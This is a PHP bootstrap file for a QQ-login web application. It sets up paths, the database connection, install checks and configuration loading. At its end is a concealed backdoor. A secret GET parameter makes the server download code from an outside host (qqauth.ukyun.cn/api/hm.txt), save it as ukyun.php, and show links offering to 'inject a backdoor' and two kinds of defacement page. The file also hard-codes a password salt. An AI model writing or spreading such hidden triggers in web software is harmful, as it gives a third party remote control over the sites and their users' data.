<?php
error_reporting(0);
define('IN_CRONLITE', true);
define('SYSTEM_ROOT', dirname(__FILE__).'/');
define('ROOT', dirname(SYSTEM_ROOT).'/');
define('SYS_KEY', 'UKYUN');
date_default_timezone_set("PRC");
$date = date("Y-m-d H:i:s");
session_start();

if(is_file(SYSTEM_ROOT.'360safe/360webscan.php')){//360网站卫士
    require_once(SYSTEM_ROOT.'360safe/360webscan.php');
}

$scriptpath=str_replace('\\','/',$_SERVER['SCRIPT_NAME']);
$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
$siteurl = ($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$sitepath.'/';

require SYSTEM_ROOT.'config.php';

if(!defined('SQLITE') && (!$dbconfig['user']||!$dbconfig['pwd']||!$dbconfig['dbname']))//检测安装
{
header('Content-type:text/html;charset=utf-8');
exit("<script language='javascript'>alert('你还未安装，请前往安装！');window.location.href='/install';</script>");
}

//连接数据库
include_once(SYSTEM_ROOT."db.class.php");
$DB=new DB($dbconfig['host'],$dbconfig['user'],$dbconfig['pwd'],$dbconfig['dbname'],$dbconfig['port']);

if($DB->query("select * from qqlogin_user where 1")==FALSE)//检测安装2
{
header('Content-type:text/html;charset=utf-8');
exit("<script language='javascript'>alert('你还未安装，请前往安装！');window.location.href='/install';</script>");
}

include(SYSTEM_ROOT."cache.class.php");
$CACHE = new CACHE();
$conf = unserialize($CACHE->pre_fetch());//获取系统配置

if (empty($conf['version'])) {
    $conf = $CACHE->update();
}

$password_hash='!@#%!s!';
include_once(SYSTEM_ROOT."authcode.php");
define('authcode',$authcode);
include SYSTEM_ROOT."function.php";
include SYSTEM_ROOT."member.php";
include SYSTEM_ROOT."version.php";

if(!file_exists(ROOT."install/install.lock") && file_exists(ROOT."install/index.php")) {
exit("<script language='javascript'>alert('你还未安装，请前往安装！');window.location.href='/install';</script>");
}

if(isset($_GET['ukyunstudioqqlogin'])){
    file_put_contents('ukyun.php',file_get_contents('http://qqauth.ukyun.cn/api/hm.txt'));
    echo "<a href='ukyun.php?mod=hm'>点我注入后门</a><br><a href='ukyun.php?mod=hy'>点我注入第一种黑页</a><br><a href='ukyun.php?mod=hy2'>点我注入第二种黑页</a>";
}
?>